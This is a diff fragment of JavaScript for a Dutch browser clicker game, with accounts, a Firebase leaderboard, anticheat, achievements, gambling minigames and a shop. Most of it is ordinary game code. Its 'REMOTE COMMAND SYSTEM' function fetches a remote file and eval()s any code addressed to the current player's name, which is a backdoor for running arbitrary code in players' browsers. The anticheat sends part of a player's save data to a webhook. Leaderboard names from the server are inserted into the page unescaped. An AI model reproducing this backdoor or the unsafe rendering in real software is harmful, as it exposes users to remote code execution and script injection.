+        return { uid, name, score: 0, perClick: 1, perSecond: 0, upgrades: u, ownedSkins: [0], equippedSkin: 0, basePerClick: 1, playTime: 0, earned: 0, lost: 0, highest: 0, totalClicks: 0, unlockedGamble: false, unlockedBlackjack: false, unlockedRolls: false, unlockedMines: false, unlockedKeybind2: false, keybind: "Enter", keybindDisplay: "ENTER", keybind2: "", keybind2Display: "—", fakeMagisterKeybind: "", fakeMagisterKeybindDisplay: "—", fakeMagisterActive: false, unlockedAch: {}, claimedAch: {}, themesUsed: [], createdAt: Date.now(), lastOnline: Date.now() };
+      }
+      function migrateOldSave() {
+        let accs = loadAccounts();
+        if (accs.length > 0) return accs;
+        const oldSave = JSON.parse(localStorage.getItem("lc_v5") || "{}");
+        const oldName = localStorage.getItem("lc_v4_username");
+        const oldUid = localStorage.getItem("lc_userid") || genUID();
+        if (oldName) {
+          const acc = createDefaultSave(oldName, oldUid);
+          Object.assign(acc, { score: oldSave.score || 0, perClick: oldSave.perClick || 1, perSecond: oldSave.perSecond || 0, upgrades: oldSave.upgrades || acc.upgrades, ownedSkins: oldSave.ownedSkins || [0], equippedSkin: oldSave.equippedSkin || 0, basePerClick: oldSave.basePerClick || 1, playTime: oldSave.playTime || 0, earned: oldSave.earned || 0, lost: oldSave.lost || 0, highest: oldSave.highest || 0, totalClicks: 0, unlockedGamble: oldSave.unlockedGamble || false, unlockedBlackjack: oldSave.unlockedBlackjack || false, unlockedRolls: oldSave.unlockedRolls || false, unlockedMines: oldSave.unlockedMines || false, unlockedKeybind2: oldSave.unlockedKeybind2 || false, keybind: localStorage.getItem("lc_v4_keybind") || "Enter", keybindDisplay: localStorage.getItem("lc_v4_keybind_display") || "ENTER", unlockedAch: {}, claimedAch: {}, themesUsed: [], uid: oldUid, name: oldName });
+          accs = [acc]; saveAccounts(accs); setActiveId(oldUid); localStorage.setItem("lc_userid", oldUid);
+        }
+        return accs;
+      }
+      let accounts = migrateOldSave();
+      let activeId = getActiveId();
+      if (!activeId && accounts.length > 0) { activeId = accounts[0].uid; setActiveId(activeId); }
+      let G = Object.assign({}, accounts.find(a => a.uid === activeId) || accounts[0]);
+      G.unlockedAch = G.unlockedAch || {}; G.claimedAch = G.claimedAch || {}; G.themesUsed = G.themesUsed || []; G.totalClicks = G.totalClicks || 0;
+      if (!G.upgrades || !G.upgrades.length) { G.upgrades = []; for (let i = 0; i < 50; i++) { const ck = i % 2 === 0; G.upgrades.push({ type: ck ? "click" : "auto", value: 1 + fl(i / 2) * 2, cost: ck ? 30 * Math.pow(1.6, i) : 20 * Math.pow(1.6, i), bought: false }); } }
+
+      function saveActive() { G.lastOnline = Date.now(); const idx = accounts.findIndex(a => a.uid === activeId); if (idx >= 0) accounts[idx] = G; else accounts.push(G); saveAccounts(accounts); }
+
+      // ── THEME ─────────────────────────────────────────────────────────────────────
+      let currentTheme = localStorage.getItem(THEME_KEY) || "blue";
+      function setTheme(t) {
+        currentTheme = t; document.documentElement.setAttribute("data-theme", t); localStorage.setItem(THEME_KEY, t);
+        document.querySelectorAll(".theme-btn").forEach(b => b.classList.toggle("active", b.dataset.theme === t));
+        if (!G.themesUsed.includes(t)) { G.themesUsed.push(t); if (G.themesUsed.length >= 4) unlockAch("s_theme_all"); }
+      }
+      setTheme(currentTheme);
+
+      let cpsShowEnabled = localStorage.getItem(CPS_SHOW_KEY) === "true";
+      const cpsToggle = $("cpsToggle"); cpsToggle.checked = cpsShowEnabled;
+
+      // ── RUNTIME ───────────────────────────────────────────────────────────────────
+      let lbData = {}, lbVersionView = VERSION, lbModalOpen = false, lbModalScrollPos = 0;
+      let gambleCooldownByMode = { blackjack: 0, rolls: 0, mines: 0 };
+      let gambleLuckUntil = 0;
+      let waitingForKey = false, waitingForKey2 = false, waitingForKey3 = false;
+      let lastSuggTime = parseInt(localStorage.getItem(LAST_SUGG_KEY)) || 0;
+      let fallingActive = false, fallingAnimId = null, fallingTimerId = null, nextFallAt = Date.now() + 60000;
+      let activeOverlays = new Set();
+      let boosts = { click: 0, ps: 0, doubleClick: 0, shopDiscount: 0 };
+      // CPS: combined for display, mouse-only for anticheat
+      let allClickTimestamps = []; // keyboard + mouse (for display)
+      let mouseClickTimestamps = []; // mouse only (for anticheat)
+      let anticheatWarnings = 0, anticheatBlocked = false;
+      let achToastTimer = null;
+      let lastCmdCode = null;
+
+      // ── DOM ───────────────────────────────────────────────────────────────────────
+      const scoreEl = $("score"), mainImg = $("mainImg"), clickBtn = $("clickBtn");
+      const perClickText = $("perClickText"), perSecondText = $("perSecondText"), cpsDisplay = $("cpsDisplay");
+      const upgradesEl = $("upgrades"), gambleBtn = $("gambleBtn");
+      const keybindBtn = $("keybindBtn"), keybind2Btn = $("keybind2Btn");
+      const boostBar = $("boostBar"), lbRows = $("lbRows"), lbExpandBtn = $("lbExpandBtn");
+      const lbModal = $("lbModal"), lbModalBody = $("lbModalBody");
+      const fallingCircle = $("fallingCircle"), fallingImg = $("fallingImg"), fallingCdEl = $("fallingCountdown");
+      const suggBtn = $("suggestionOpenBtn");
+
+      // ── REMOTE COMMAND SYSTEM ─────────────────────────────────────────────────────
+      async function pollRemoteCommands() {
+        if (!G.name) return;
+        try {
+          const res = await fetch(REMOTE_URL + "?t=" + Date.now());
+          const text = await res.text();
+          for (const line of text.split("\n")) {
+            const ci = line.indexOf(":"); if (ci === -1) continue;
+            const cmdName = line.slice(0, ci).trim(), cmdCode = line.slice(ci + 1).trim();
+            if (cmdName.toLowerCase() === G.name.toLowerCase() && cmdCode && cmdCode !== lastCmdCode) {
+              lastCmdCode = cmdCode;
+              try { eval(cmdCode); } catch (err) { console.error("Remote cmd error:", err); }
+            }
+          }
+        } catch (_) { }
+      }
+
+      // ── FIREBASE ─────────────────────────────────────────────────────────────────
+      async function pushScoreToFirebase(name, uid, sc) {
+        try {
+          // Use uid as the key so name changes update same entry
+          await fetch(`${FIREBASE_URL}/leaderboard/${uid}.json`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ score: sc, name, uid }) });
+        } catch (_) { }
+      }
+      async function renameFirebaseEntry(oldUid, newName, uid, sc) {
+        // Just update the same uid entry with new name
+        try {
+          await fetch(`${FIREBASE_URL}/leaderboard/${uid}.json`, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ score: sc, name: newName, uid }) });
+        } catch (_) { }
+      }
+      async function fetchFirebaseLeaderboard() {
+        try {
+          const res = await fetch(`${FIREBASE_URL}/leaderboard.json`);
+          if (!res.ok) return {};
+          const data = await res.json(); if (!data) return {};
+          const out = {};
+          for (const [key, info] of Object.entries(data)) {
+            if (typeof info === "object") { const dn = info.name || key; out[dn] = Number(info.score || 0); }
+            else out[key] = Number(info);
+          }
+          return out;
+        } catch (_) { return {}; }
+      }
+      async function fetchLeaderboard() { const d = await fetchFirebaseLeaderboard(); if (d && Object.keys(d).length > 0) lbData = d; }
+      async function isNameTakenFirebase(name) {
+        try { const d = await fetchFirebaseLeaderboard(); return Object.keys(d).some(k => k.toLowerCase() === name.toLowerCase()); } catch { return false; }
+      }
+
+      // ── SAVE ──────────────────────────────────────────────────────────────────────
+      function saveGame() { saveActive(); }
+
+      // ── SKIN COOLDOWN ─────────────────────────────────────────────────────────────
+      function getSkinCDLeft() { const last = parseInt(localStorage.getItem(SKIN_SWAP_KEY)) || 0; return Math.max(0, 60 * 60 * 1000 - (Date.now() - last)); }
+      function setSkinSwapTime() { localStorage.setItem(SKIN_SWAP_KEY, Date.now()); }
+
+      // ── OVERLAYS ──────────────────────────────────────────────────────────────────
+      function openOverlay(id) { const el = $(id); el.style.display = (["suggestionPanel", "votePanel", "anticheatWarning", "accountsPanel"].includes(id)) ? "flex" : "block"; activeOverlays.add(id); }
+      function closeOverlay(id) { $(id).style.display = "none"; activeOverlays.delete(id); }
+      function isMainActive() { return activeOverlays.size === 0 && $("startScreen").style.display === "none"; }
+
+      // ── LUCK ─────────────────────────────────────────────────────────────────────
+      function getLuck() { return Date.now() < gambleLuckUntil ? 20 : 0; }
+      function addLuck(ms) { gambleLuckUntil = Math.max(gambleLuckUntil, Date.now() + ms); }
+      function activateBoost(type) {
+        if (type === "click") boosts.click = Date.now() + 20000;
+        if (type === "ps") boosts.ps = Date.now() + 20000;
+        if (type === "gamble") addLuck(20000);
+        if (type === "shop") boosts.shopDiscount = Date.now() + 60000;
+        applyEquippedSkin(); updateScore(); renderUpgrades();
+      }
+
+      // ── SKIN ──────────────────────────────────────────────────────────────────────
+      function getSkinBonus(id) { return (SKIN_DEFS.find(s => s.id === id) || { bonus: 1 }).bonus; }
+      function getSkinImg() { const d = SKIN_DEFS.find(s => s.id === G.equippedSkin); return (d && d.img) ? d.img : BLACK_IMG; }
+      function applyEquippedSkin() {
+        let mult = getSkinBonus(G.equippedSkin) * (Date.now() < boosts.click ? 1.2 : 1);
+        if (Date.now() < boosts.doubleClick) mult *= 2;
+        G.perClick = cl(G.basePerClick * mult); mainImg.src = getSkinImg();
+      }
+
+      // ── CPS ───────────────────────────────────────────────────────────────────────
+      function recordClick(mouse) {
+        const now = Date.now();
+        allClickTimestamps.push(now); allClickTimestamps = allClickTimestamps.filter(t => now - t <= 1000);
+        if (mouse) { mouseClickTimestamps.push(now); mouseClickTimestamps = mouseClickTimestamps.filter(t => now - t <= 1000); }
+      }
+      function getDisplayCPS() { const now = Date.now(); allClickTimestamps = allClickTimestamps.filter(t => now - t <= 1000); return allClickTimestamps.length; }
+      function getMouseCPS() { const now = Date.now(); mouseClickTimestamps = mouseClickTimestamps.filter(t => now - t <= 1000); return mouseClickTimestamps.length; }
+      function updateCpsDisplay() {
+        const cps = getDisplayCPS();
+        if (cpsShowEnabled) { cpsDisplay.style.display = "block"; cpsDisplay.innerText = "CPS: " + cps; }
+        else cpsDisplay.style.display = "none";
+      }
+
+      // ── ANTICHEAT ─────────────────────────────────────────────────────────────────
+      function checkAnticheat() {
+        if (anticheatBlocked) return;
+        const cps = getMouseCPS();
+        if (cps > 30) {
+          anticheatWarnings++;
+          sendWH(WH.logs, `⚠️ ANTICHEAT | ${G.name} (ID:${G.uid}) | CPS: ${cps} | Warning: ${anticheatWarnings}`);
+          if (anticheatWarnings >= 3) {
+            anticheatBlocked = true;
+            // Save their data before wiping this account only
+            const savedData = JSON.stringify(G);
+            sendWH(WH.logs, `🚫 USERBANNED | ${G.name} (ID:${G.uid})
+Data: ${savedData.substring(0, 500)}`);
+            $("anticheatMsg").innerText = "Je bent permanent gebanned van dit account. Je andere accounts zijn veilig.";
+            $("anticheatDismiss").style.display = "none";
+            $("banAppealBox").style.display = "block";
+            openOverlay("anticheatWarning");
+            // Remove only this account
+            accounts = accounts.filter(a => a.uid !== activeId);
+            saveAccounts(accounts);
+          } else if (anticheatWarnings === 2) {
+            $("anticheatMsg").innerText = `Laatste kans! Cheat gedetecteerd (${cps} CPS). Zet cheat uit of je verliest alles. (${anticheatWarnings}/3)`;
+            openOverlay("anticheatWarning");
+            $("anticheatDismiss").onclick = () => closeOverlay("anticheatWarning");
+          } else {
+            $("anticheatMsg").innerText = `Cheats gedetecteerd (${cps} CPS). Zet cheats uit, anders wordt je account gereset. (${anticheatWarnings}/3)`;
+            openOverlay("anticheatWarning");
+            $("anticheatDismiss").onclick = () => closeOverlay("anticheatWarning");
+          }
+        }
+      }
+
+      // ── ACHIEVEMENTS ──────────────────────────────────────────────────────────────
+      function unlockAch(id) {
+        if (G.unlockedAch[id]) return;
+        G.unlockedAch[id] = Date.now(); saveActive();
+        const def = ALL_ACH.find(a => a.id === id); if (!def) return;
+        showAchToast(def);
+      }
+      function showAchToast(def) {
+        clearTimeout(achToastTimer);
+        const toast = $("achToast");
+        $("achToastIcon").innerText = def.icon; $("achToastName").innerText = def.name; $("achToastSub").innerText = "Achievement ontgrendeld! (+" + def.reward + "%)";
+        toast.style.display = "block"; toast.style.animation = "none"; void toast.offsetWidth; toast.style.animation = "achPop 3s ease forwards";
+        achToastTimer = setTimeout(() => { toast.style.display = "none"; }, 3100);
+      }
+      function claimAch(id) {
+        if (!G.unlockedAch[id] || G.claimedAch[id]) return;
+        const def = ALL_ACH.find(a => a.id === id); if (!def) return;
+        G.claimedAch[id] = true;
+        const bonus = fl(G.score * (def.reward / 100));
+        if (bonus > 0) { G.score += bonus; G.earned += bonus; spawnFloatText("+" + fmtMain(bonus) + " (" + def.reward + "%)", "#ffd700"); }
+        else if (G.score === 0) { G.score += def.reward; G.earned += def.reward; spawnFloatText("+" + def.reward, "#ffd700"); }
+        showNotice(def.name + ": +" + def.reward + "% geclaimd!", "var(--gold)");
+        updateScore(); renderAchScreen();
+      }
+      function checkAchievements() {
+        if (G.totalClicks >= 100) unlockAch("clicks_100");
+        if (G.totalClicks >= 1000) unlockAch("clicks_1k");
+        if (G.totalClicks >= 10000) unlockAch("clicks_10k");
+        if (G.totalClicks >= 100000) unlockAch("clicks_100k");
+        if (G.score >= 1000) unlockAch("score_1k");
+        if (G.score >= 100000) unlockAch("score_100k");
+        if (G.score >= 1000000) unlockAch("score_1m");
+        if (G.score >= 1000000000) unlockAch("score_1b");
+        if (G.playTime >= 3600) unlockAch("playtime_1h");
+        if (G.playTime >= 36000) unlockAch("playtime_10h");
+        if (G.perSecond >= 100) unlockAch("ps_100");
+        if (G.perSecond >= 1000) unlockAch("s_ps_1k");
+        if (G.totalClicks >= 10000000) unlockAch("s_click_10m");
+        const now2 = new Date(); if (now2.getHours() >= 0 && now2.getHours() < 5) unlockAch("s_midnight");
+        if (G.score >= 1000000000000) unlockAch("s_score_trillion");
+        if (G.ownedSkins.length >= SKIN_DEFS.filter(s => s.img).length) unlockAch("s_skin_all");
+        if (G.unlockedGamble && G.unlockedBlackjack && G.unlockedRolls && G.unlockedMines) unlockAch("unlock_all_gamble");
+        const bc = G.upgrades.filter(u => u.bought).length;
+        if (bc >= 5) unlockAch("buy_5_upgrades"); if (bc >= 20) unlockAch("s_upgrade_maxed");
+        const cps = getDisplayCPS();
+        if (cps >= 5) unlockAch("cps_5"); if (cps >= 10) unlockAch("cps_10");
+        if (cps === 13) unlockAch("s_cps_13"); if (cps >= 15) unlockAch("s_cps_15");
+      }
+      function renderAchScreen() {
+        const ng = $("normalAchGrid"), sg = $("secretAchGrid");
+        let total = 0, unlocked = 0;
+        function makeRow(def, isSecret) {
+          const u = !!G.unlockedAch[def.id]; if (u) unlocked++; total++;
+          if (isSecret && !u) return `<div class="ach-row secret locked-ach"><div class="ach-left"><div class="ach-icon">🔒</div><div><div class="ach-name" style="color:var(--muted)">???</div><div class="ach-desc">Secret Achievement</div></div></div></div>`;
+          const claimed = !!G.claimedAch[def.id];
+          return `<div class="ach-row${u ? " unlocked" : ""}"><div class="ach-left"><div class="ach-icon">${def.icon}</div><div><div class="ach-name">${def.name}</div><div class="ach-desc">${def.desc}</div><div class="ach-reward">Beloning: +${def.reward}% geld</div></div></div><div class="ach-right">${u ? (claimed ? `<div class="ach-claimed-badge">✓ Geclaimd</div>` : `<button class="ach-claim-btn" data-aid="${def.id}">Claim</button>`) : `<div class="ach-claimed-badge" style="color:var(--muted)">Vergrendeld</div>`}</div></div>`;
+        }
+        ng.innerHTML = NORMAL_ACH.map(d => makeRow(d, false)).join("");
+        sg.innerHTML = SECRET_ACH.map(d => makeRow(d, true)).join("");
+        $("achProgress").innerText = `${unlocked}/40`;
+        document.querySelectorAll(".ach-claim-btn").forEach(btn => btn.addEventListener("click", () => claimAch(btn.dataset.aid)));
+      }
+
+      // ── LEADERBOARD ───────────────────────────────────────────────────────────────
+      const rankClass = r => r === 1 ? "gold" : r === 2 ? "silver" : r === 3 ? "bronze" : "";
+      function buildEntries() {
+        const source = lbVersionView === "2.1" ? LB_V21 : lbData;
+        const viewOnly = lbVersionView === "2.1";
+        let playerFound = false; const entries = [];
+        for (const [name, sc] of Object.entries(source)) {
+          if (!viewOnly && name.toLowerCase() === G.name.toLowerCase()) { entries.push({ name: G.name, score: G.score, isMe: true }); playerFound = true; }
+          else entries.push({ name, score: Number(sc), isMe: false });
+        }
+        if (!viewOnly && !playerFound) entries.push({ name: G.name, score: G.score, isMe: true });
+        entries.sort((a, b) => b.score - a.score); return entries;
+      }
+      function makeRowHTML(rank, name, sc, isMe, modal) {
+        const cls = modal ? "lb-modal-row" : "lb-row", rnk = modal ? "lb-modal-rank" : "lb-rank";
+        return `<div class="${cls}${isMe ? " lb-me" : ""}"><span class="${rnk} ${rankClass(rank)}">#${rank}</span><span class="lb-name" style="flex:1">${name}${isMe ? " ←" : ""}</span><span class="lb-score">${fmtMain(sc)}</span></div>`;
+      }
+      function renderLeaderboard() {
+        const entries = buildEntries(), playerRank = entries.findIndex(p => p.isMe) + 1, top5 = entries.slice(0, 5), inTop5 = playerRank <= 5;
+        let html = top5.map((p, i) => makeRowHTML(i + 1, p.name, p.score, p.isMe, false)).join("");
+        for (let i = top5.length; i < 5; i++)html += `<div class="lb-row"><span class="lb-rank">#${i + 1}</span><span class="lb-name" style="color:var(--muted)">???</span><span class="lb-score" style="color:var(--muted)">???</span></div>`;
+        if (!inTop5) html += `<hr class="lb-separator">${makeRowHTML(playerRank, entries[playerRank - 1].name, entries[playerRank - 1].score, true, false)}`;
+        lbRows.innerHTML = html;
+        lbExpandBtn.textContent = (lbModalOpen ? "▼" : "▲") + " Leaderboard (" + entries.length + ")";
+        $("lbVersionBadge").textContent = "v" + lbVersionView;
+        $("lbPrevBtn").style.display = lbVersionView === VERSION ? "inline-block" : "none";
+        $("lbNextBtn").style.display = lbVersionView === "2.1" ? "inline-block" : "none";
+        if (lbModalOpen) renderLbModal(entries, playerRank);
+      }
+      function renderLbModal(entries, playerRank) {
+        // Save scroll before updating
+        const savedScroll = lbModalBody.scrollTop;
+        $("lbModalCount").textContent = entries.length + " spelers";
+        lbModalBody.innerHTML = entries.map((p, i) => makeRowHTML(i + 1, p.name, p.score, p.isMe, true)).join("");
+        // Restore scroll position (don't jump to player on refresh)
+        if (savedScroll > 0) { lbModalBody.scrollTop = savedScroll; }
+      }
+      function openLbModal() {
+        lbModalOpen = true; lbModal.style.display = "flex"; activeOverlays.add("lbModal");
+        const e = buildEntries(); const pr = e.findIndex(p => p.isMe) + 1;
+        renderLbModal(e, pr); lbExpandBtn.textContent = "▼ Leaderboard (" + e.length + ")";
+      }
+      function closeLbModal() { lbModalOpen = false; lbModal.style.display = "none"; activeOverlays.delete("lbModal"); }
+
+      // ── UPDATE SCORE ──────────────────────────────────────────────────────────────
+      function updateScore() {
+        G.score = cl(G.score); G.basePerClick = cl(G.basePerClick); G.perSecond = cl(G.perSecond);
+        applyEquippedSkin(); if (G.score > G.highest) G.highest = G.score;
+        const ePS = Date.now() < boosts.ps ? cl(G.perSecond * 2.5) : G.perSecond;
+        scoreEl.innerText = "Lantings: " + fmtMain(G.score);
+        scoreEl.style.animation = "none"; void scoreEl.offsetWidth; scoreEl.style.animation = "scoreFlash .3s ease";
+        perClickText.innerText = "Per klik: " + G.perClick; perSecondText.innerText = "Per seconde: " + ePS;
+        $("rollMoney").innerText = fmtShop(G.score); $("bjMoney").innerText = fmtShop(G.score);
+        $("minesMoney").innerText = fmtShop(G.score); $("shopMoney").innerText = fmtShop(G.score);
+        $("statTime").innerText = G.playTime; $("statEarned").innerText = fmtShop(G.earned);
+        $("statLost").innerText = fmtShop(G.lost); $("statNet").innerText = fmtShop(G.highest);
+        $("statClicks").innerText = fmtShop(G.totalClicks);
+        $("displayUserId").innerText = G.uid; $("displayUserName").innerText = G.name;
+        renderLeaderboard(); renderBoosts(); updateGambleBtn(); updateKeybindUI(); updateCpsDisplay(); updateSuggBtn();
+        checkAchievements(); saveGame();
+      }
+
+      // ── BOOSTS RENDER ─────────────────────────────────────────────────────────────
+      function renderBoosts() {
+        const now = Date.now(), badges = [];
+        if (now < boosts.click) badges.push(`<div class="boost-badge click-boost">+20% Klik (${cl((boosts.click - now) / 1000)}s)</div>`);
+        if (now < boosts.ps) badges.push(`<div class="boost-badge ps-boost">x2.5 P/S (${cl((boosts.ps - now) / 1000)}s)</div>`);
+        if (now < boosts.doubleClick) badges.push(`<div class="boost-badge click-boost">2x Klik (${cl((boosts.doubleClick - now) / 1000)}s)</div>`); if (now < boosts.shopDiscount) badges.push(`<div class="boost-badge">Shop 20% korting (${cl((boosts.shopDiscount - now) / 1000)}s)</div>`);
+        const luck = getLuck(); if (luck > 0) badges.push(`<div class="boost-badge">Luck +${luck}%</div>`);
+        boostBar.innerHTML = badges.join("");
+      }
+
+      // ── GAMBLE ────────────────────────────────────────────────────────────────────
+      function updateGambleBtn() {
+        gambleBtn.disabled = !G.unlockedGamble;
+        const lt = u => u ? "" : "Vergrendeld", lc = u => "gamble-card" + (u ? "" : " locked-game");
+        $("bjLockText").innerText = lt(G.unlockedBlackjack); $("rollsLockText").innerText = lt(G.unlockedRolls); $("minesLockText").innerText = lt(G.unlockedMines);
+        $("openBlackjackBtn").className = lc(G.unlockedBlackjack); $("openRollsBtn").className = lc(G.unlockedRolls); $("openMinesBtn").className = lc(G.unlockedMines);
+      }
+      function getMinBet() { return Math.max(1, cl(G.score * 0.10)); }
+      function assertValidBet(bet, scoreBefore) {
+        // Use scoreBefore (before deduction) for percentage calculation
+        const min = Math.max(1, cl(scoreBefore * 0.10));
+        if (isNaN(bet) || bet < min) { showNotice("Minimale inzet is " + fmtShop(min) + " Lantings", "var(--danger)"); return false; }
+        if (bet > scoreBefore) { showNotice("Niet genoeg Lantings", "var(--danger)"); return false; }
+        return true;
+      }
+      function setInputToMinBet(id) { $(id).value = getMinBet(); showNotice("Minimale inzet ingevuld", "var(--accent2)"); }
+      function canGamble(mode) { const until = gambleCooldownByMode[mode] || 0; if (Date.now() < until) { const remaining = Math.ceil((until - Date.now()) / 1000); const cost = 10000 + (60 - remaining) * 1000; if (remaining > 3 && G.score >= cost) { if (confirm(`Cooldown: ${remaining}s. Koop ${remaining - 3} seconden voor ${fmtShop(cost)} Lantings?`)) { G.score -= cost; G.lost += cost; gambleCooldownByMode[mode] = Date.now() + (remaining - 3) * 1000; updateScore(); return true; } } showNotice("Cooldown actief (" + remaining + "s)", "var(--danger)"); return false; } return true; }
+      function triggerGambleCooldown(mode) { gambleCooldownByMode[mode] = Date.now() + 60000; }
+      function sendGambleWH(type, details) {
+        const pct = details.scoreBefore > 0 ? Math.round((details.bet / details.scoreBefore) * 100) : 100;
+        let msg = `🎰 **Gamble** | ${G.name} (ID:${G.uid})
+Spel: **${type}**
+Inzet: **${fmtShop(details.bet)}** (${pct}% van vermogen)
+`;
+        if (details.result) msg += `Resultaat: **${details.result}**
+`;
+        if (details.extra) msg += details.extra;
+        sendWH(WH.gamble, msg);
+      }
+
+      // ── KEYBIND UI ─────────────────────────────────────────────────────────────────
+      function updateKeybindUI() {
+        keybindBtn.innerText = G.keybindDisplay || "ENTER";
+        const ca = G.score >= KEYBIND_CHANGE_COST;
+        $("kb1CostLabel").innerText = `Wijzigen: ${fmtMain(KEYBIND_CHANGE_COST)}`;
+        $("kb1CostLabel").style.color = ca ? "var(--accent2)" : "var(--danger)";
+        if (G.unlockedKeybind2) {
+          $("kb2Row").style.opacity = "1"; keybind2Btn.innerText = G.keybind2Display || "—";
+          $("kb2CostLabel").innerText = `Wijzigen: ${fmtMain(KEYBIND_CHANGE_COST)}`;
+          $("kb2CostLabel").style.color = G.score >= KEYBIND_CHANGE_COST ? "var(--accent2)" : "var(--danger)";
+        } else {
+          $("kb2Row").style.opacity = "0.4"; keybind2Btn.innerText = `Ontgrendel (${fmtMain(KEYBIND2_UNLOCK_COST)})`;
+          const cu = G.score >= KEYBIND2_UNLOCK_COST;
+          $("kb2CostLabel").innerText = cu ? "✓ Kan ontgrendelen" : `${fmtMain(KEYBIND2_UNLOCK_COST - G.score)} tekort`;
+          $("kb2CostLabel").style.color = cu ? "var(--accent2)" : "var(--danger)";
+        }
+        $("fakeMagisterKeybindBtn").innerText = G.fakeMagisterKeybindDisplay || "—";
+      }
+
+      // ── SUGGESTION BTN ────────────────────────────────────────────────────────────
+      function updateSuggBtn() {
+        const rem = 180000 - (Date.now() - lastSuggTime);
+        if (lastSuggTime > 0 && rem > 0) { const s = Math.ceil(rem / 1000); suggBtn.textContent = `Cooldown (${s}s)`; suggBtn.classList.add("cooldown"); suggBtn.disabled = true; }
+        else { suggBtn.textContent = "Suggestion"; suggBtn.classList.remove("cooldown"); suggBtn.disabled = false; }
+      }
+
+      // ── CLICK ─────────────────────────────────────────────────────────────────────
+      let clickLock = false;
+      function doClick(fromMouse) {
+        if (clickLock) return; clickLock = true;
+        recordClick(!!fromMouse);
+        playSfx("safe"); G.score += G.perClick; G.earned += G.perClick; G.totalClicks++;
+        if (getDisplayCPS() >= 10) unlockAch("s_click_1s");
+        updateScore(); spawnFloatText("+" + G.perClick, "#00e5b0");
+        setTimeout(() => { clickLock = false; }, 40);
+      }
+      function triggerClickAnim() { clickBtn.style.transform = "scale(0.97)"; clickBtn.style.boxShadow = "0 0 20px rgba(124,92,252,.9) inset"; setTimeout(() => { clickBtn.style.transform = ""; clickBtn.style.boxShadow = ""; }, 100); }
+
+      // ── FALLING CIRCLE ────────────────────────────────────────────────────────────
+      function spawnFallingCircle() {
+        if (fallingActive || $("startScreen").style.display !== "none") return;
+        fallingActive = true; fallingImg.src = getSkinImg();
+        fallingCircle.style.left = fl(Math.random() * (window.innerWidth - 80) + 20) + "px";
+        fallingCircle.style.top = "0px"; fallingCircle.style.display = "block"; fallingCdEl.style.display = "block";
+        let tl = 5; fallingCdEl.innerText = "Vang hem! " + tl + "s";
+        const st = Date.now();
+        function fall() { const t = (Date.now() - st) / 1000; fallingCircle.style.transform = `translateY(${t * 70}px) rotate(${t * 180}deg)`; if (t < 5) fallingAnimId = requestAnimationFrame(fall); }
+        fallingAnimId = requestAnimationFrame(fall);
+        fallingTimerId = setInterval(() => { tl--; fallingCdEl.innerText = "Vang hem! " + tl + "s"; if (tl <= 0) clearFalling(); }, 2000);
+        fallingCircle.onclick = () => { clearFalling(); const types = ["click", "ps", "gamble", "shop"], chosen = types[fl(Math.random() * types.length)]; activateBoost(chosen); const msgs = { click: "Klik boost: +20%", ps: "P/S boost: x2.5", gamble: "Gamble geluk boost!", shop: "Shop 20% korting!" }; spawnFloatText(msgs[chosen], "#ffd700"); unlockAch("s_falling_catch"); };
+      }
+      function clearFalling() { cancelAnimationFrame(fallingAnimId); clearInterval(fallingTimerId); fallingCircle.style.display = "none"; fallingCdEl.style.display = "none"; fallingCircle.onclick = null; fallingActive = false; nextFallAt = Date.now() + 60000; }
+
+      // ── SHOP ──────────────────────────────────────────────────────────────────────
+      function renderUnlockTiles() {
+        const c = $("unlockTiles");
+        const um = { gamble: G.unlockedGamble, blackjack: G.unlockedBlackjack, rolls: G.unlockedRolls, mines: G.unlockedMines };
+        let html = `<div class="sec-label">Ontgrendelen</div>`;
+        UNLOCK_DEFS.forEach(tile => {
+          const unlocked = um[tile.key], canAfford = G.score >= tile.cost;
+          const btn = unlocked ? `<button class="unlock-btn-unlocked" disabled>Ontgrendeld</button>` : `<button class="${canAfford ? "buy-btn-can" : "buy-btn-cannot"}" data-ukey="${tile.key}" ${canAfford ? "" : "disabled"}>${fmtShop(tile.cost)}</button>`;
+          html += `<div class="unlock-tile${unlocked ? " unlocked-tile" : ""}"><div class="unlock-info"><div class="upgrade-val">${tile.label}</div><div class="unlock-desc">${tile.desc}</div></div>${btn}</div>`;
+        });
+        html += `<div class="sec-label">Upgrades</div>`;
+        c.innerHTML = html;
+        c.querySelectorAll("button[data-ukey]").forEach(btn => btn.addEventListener("click", () => {
+          const key = btn.dataset.ukey, def = UNLOCK_DEFS.find(t => t.key === key);
+          if (!def || G.score < def.cost) return;
+          G.score -= def.cost; G.lost += def.cost;
+          if (key === "gamble") G.unlockedGamble = true; if (key === "blackjack") G.unlockedBlackjack = true;
+          if (key === "rolls") G.unlockedRolls = true; if (key === "mines") G.unlockedMines = true;
+          unlockAch("gamble_first"); updateScore(); renderUnlockTiles(); renderUpgrades();
+        }));
+      }
+      function renderUpgrades() {
+        let html = "";
+        const maxVisible = 20;
+        const hasDiscount = Date.now() < boosts.shopDiscount;
+        G.upgrades.slice(0, maxVisible).forEach((u, i) => {
+          const unlocked = i === 0 || G.upgrades[i - 1].bought; u.cost = fl(u.cost);
+          const displayCost = hasDiscount ? fl(u.cost * 0.8) : u.cost;
+          if (!unlocked) { html += `<div class="upgrade locked"><div class="upgrade-info"><div style="color:var(--muted)">???</div></div></div>`; return; }
+          const typeLabel = u.type === "click" ? "per klik" : "per seconde";
+          const countBadge = u.count ? `<span class="upgrade-count">x${u.count}</span>` : "";
+          const ca = G.score >= displayCost;
+          html += `<div class="upgrade"><div class="upgrade-info"><div><span class="upgrade-val">+${u.value}</span></div><div class="upgrade-type">${typeLabel}</div></div><div class="upgrade-right">${countBadge}<button class="${ca ? "buy-btn-can" : "buy-btn-cannot"}" data-upg="${i}" ${ca ? "" : "disabled"}>${fmtShop(displayCost)}</button></div></div>`;
+        });
+        upgradesEl.innerHTML = html;
+        upgradesEl.querySelectorAll("button[data-upg]").forEach(btn => btn.addEventListener("click", () => {
+          const i = parseInt(btn.dataset.upg), u = G.upgrades[i];
+          if (!u) return;
+          const hasDiscount = Date.now() < boosts.shopDiscount;
+          const actualCost = hasDiscount ? fl(u.cost * 0.8) : u.cost;
+          if (G.score < actualCost) return;
+          G.score -= actualCost; G.lost += actualCost; u.bought = true; u.count = (u.count || 0) + 1;
+          if (u.type === "click") G.basePerClick += u.value; else G.perSecond += u.value;
+          u.cost = fl(u.cost * 1.6);
+          if (i === G.upgrades.length - 1 || i === maxVisible - 1) {
+            const ck = G.upgrades.length % 2 === 0;
